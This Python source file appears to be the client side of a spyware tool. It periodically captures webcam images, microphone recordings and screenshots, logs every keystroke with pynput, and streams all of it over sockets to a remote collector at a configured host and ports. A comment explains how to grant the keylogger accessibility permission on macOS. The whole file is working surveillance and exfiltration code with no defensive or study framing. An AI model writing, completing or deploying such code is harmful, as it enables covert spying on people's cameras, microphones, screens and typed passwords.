import numpy as np
from mlsocket import MLSocket
import cv2
import time
import sounddevice as sd
import socket
import os
from PIL import Image,ImageGrab
from multiprocessing import Process
from pynput.keyboard import Key, Listener


HOST = '0.0.0.0'
PORT = 65447

TPORT = 65450

track_sock = socket.socket()
#track_sock.setblocking(0)
track_sock.connect((HOST, TPORT))
track_sock.close()


def sound_capture():
    global recording
    frequency = 44400
 
    # Recording duration in seconds
    duration = 3.5
    
    # to record audio from
    # sound-device into a Numpy
    recording = sd.rec(int(duration * frequency), samplerate=frequency, channels=2)
    # Wait for the audio to complete
    sd.wait() 


def screenshot():
    global screenimg
    screeny = ImageGrab.grab()
    screenimg = np.array(screeny)



# Make an ndarray
cam_port = 0
cam = cv2.VideoCapture(cam_port)
# Send data
#keys = []

def allbutkey():
                s = MLSocket()
                s.connect((HOST, PORT))
                print("successfully connected. ")
                #s.setblocking(0)
                f = MLSocket()
                f.connect((HOST, PORT))
                print("successfully connected")
                picpasttime = time.time()
                soundpasttime = time.time()
                screenshotpasstime = time.time()
                            
                while True: # every 5 seconds. 
                        curtime = time.time()
                        picdiff = round(curtime - picpasttime)
                        sounddiff = round(curtime - soundpasttime)
                        screenshotdiff = round(curtime - screenshotpasstime)
                        if picdiff % 18 == 0:
                            time.sleep(1)
                            picpasttime = curtime
                            result, image = cam.read()
                            mess = np.array(["image"])
                            f.send(mess)
                            s.send(image) # After sending the data, it will wait until it receives the reponse from the server
 

                        if sounddiff % 30 == 0:
                            time.sleep(1)
                            soundpasttime = curtime
                            mess = np.array(["sound"])
                            sound_capture()
                            f.send(mess)
                            s.send(recording)

                        if screenshotdiff % 22 == 0:
                            time.sleep(1)
                            screenshotpasstime = curtime
                            mess = np.array(["screen"])
                            screenshot()
                            f.send(mess)
                            s.send(screenimg)

                        '''if len(keys) > 10: 
                            datatype = np.array(["keystrokes"])
                            print(f"length of keys is:{len(keys)}")
                            f.send(datatype)
                            s.send(keys[0])
'''

word = ""
sentence = ""
character_limit = 20

def keystrokes():
    #to provide accessibility:
    #system preferences > security & privacy > accessibility. 
    g = MLSocket()
    g.connect((HOST, PORT))
    print("keystroke socket successfully connected. ")
    
    def on_press(key): #how to combine the listener with socket, whereby if client is sent interrupt signal while listening it will break out of the listening phase? 
        global word
        global sentence
        global character_limit
        if key == Key.esc or key == Key.shift_l or key == Key.shift_r or key == Key.enter:
            pass

        elif key == Key.space:
            print("space registered")
            word += " "
            sentence += word
            word = ""
            print(f"length of the sentence is {len(sentence)}")
            if len(sentence) >= character_limit: #print after 60 seconds inactivity
                #datatype = np.array(["keystrokes"])
                sendsent = np.array(sentence)
                g.send(sendsent)
                print(f"sentence is: {sentence} trying to send it now")
                sentence = ""
                word =""


        elif key == Key.backspace: 
            if len(word) == 0:
                sentence = sentence[:-1]
            
            else:
                word = word[:-1]

        else:
            char = f'{key}'
            char = char[1:-1]
            word += char


    with Listener(on_press=on_press) as f: #exec seems to pause here until input recv, once inp recv then does. 
        f.join()

if __name__ == '__main__':                                                                               
    m = Process(target=keystrokes)                                                                     
    p = Process(target=allbutkey)
    p.start() 
    m.start()
                    


